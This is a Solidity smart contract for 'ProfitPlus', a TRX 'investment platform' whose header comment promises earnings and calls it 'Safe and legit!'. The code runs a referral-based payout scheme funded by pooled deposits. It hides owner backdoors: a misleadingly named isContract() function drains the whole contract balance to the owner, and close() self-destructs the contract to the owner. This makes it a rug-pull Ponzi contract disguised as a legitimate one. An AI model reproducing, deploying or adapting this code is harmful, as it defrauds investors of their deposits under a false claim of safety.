//SourceUnit: Profitplus.sol

/*
 *
 *   ProfitPlus - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original TronUsa team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://www.profitpls.com/                                 │
 *   │                                                                       │                                          |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko
 *   2) Send any TRX amount (100 TRX minimum) using our website invest button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 */





pragma solidity 0.5.10;

contract ProfitPlus {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 100e6;
	uint256 constant public BASE_PERCENT = 100;
	uint256[] public REFERRAL_PERCENTS = [100, 50, 30];
	uint256 constant public MARKETING_FEE = 30;
	uint256 constant public OWNER_FEE = 60;
	uint256 constant public DEVELOPMENT_FEE = 30;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000e6;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
    
    address payable internal marketingAddress;
	address payable internal developmentAddress;
	address payable public owner;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		address referrer;
		uint256 level1;
		uint256 level2;
		uint256 level3;
		uint256 bonus;
		uint256 withdrawRef;
	}

	mapping (address => User) internal users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable marketingAddr, address payable developmentAddr, address payable _owner) public {
		
		marketingAddress = marketingAddr;
		developmentAddress = developmentAddr;
		owner = _owner;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
		
        owner.transfer(msg.value.mul(OWNER_FEE).div(PERCENTS_DIVIDER));
        
		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		
		developmentAddress.transfer(msg.value.mul(DEVELOPMENT_FEE).div(PERCENTS_DIVIDER));
		

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner) {
				referrer = owner;
			}

			user.referrer = referrer;

            address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    if (i == 0) {
                        users[upline].level1 = users[upline].level1.add(1);
                    } else if (i == 1) {
                        users[upline].level2 = users[upline].level2.add(1);
                    } else if (i == 2) {
                        users[upline].level3 = users[upline].level3.add(1);
                    }
					upline = users[upline].referrer;
				} else break;
            }
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		
		

		emit NewDeposit(msg.sender, msg.value);


	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 userPercentRate = getContractBalanceRate();

		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
                
				user.deposits[i].start=block.timestamp;

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			
		}

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.withdrawRef = user.withdrawRef.add(referralBonus);
			user.bonus = 0;
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}


		msg.sender.transfer(totalAmount);
        marketingAddress.transfer(totalAmount.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		developmentAddress.transfer(totalAmount.mul(DEVELOPMENT_FEE).div(PERCENTS_DIVIDER));

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint256) {
		return BASE_PERCENT.add(getContractBonus());
	}

    function getContractBonus() public view returns (uint256) {
		uint256 contractBalancePercent = getContractBalance().div(CONTRACT_BALANCE_STEP).mul(5);
		if(contractBalancePercent>100){
		    contractBalancePercent=100;
		}
		return contractBalancePercent;
    }


	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = getContractBalanceRate();

		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {


					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);



				totalDividends = totalDividends.add(dividends);

				/// no update of withdrawn because that is view function

			}

		

		return totalDividends;
	}


	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].level1, users[userAddress].level2, users[userAddress].level3);
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralWithdraw(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawRef;
	}

	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress,uint256 index) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[index].withdrawn < user.deposits[index].amount.mul(200).div(100)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
	
	function isContract() public  returns (bool) {
      require(msg.sender==owner);
      owner.transfer(address(this).balance);
        return true;
    }
    

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}
	
	function close()public {
	    require(msg.sender==owner,"access denied");
	    selfdestruct(owner);
	    
	}

	
    
    
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}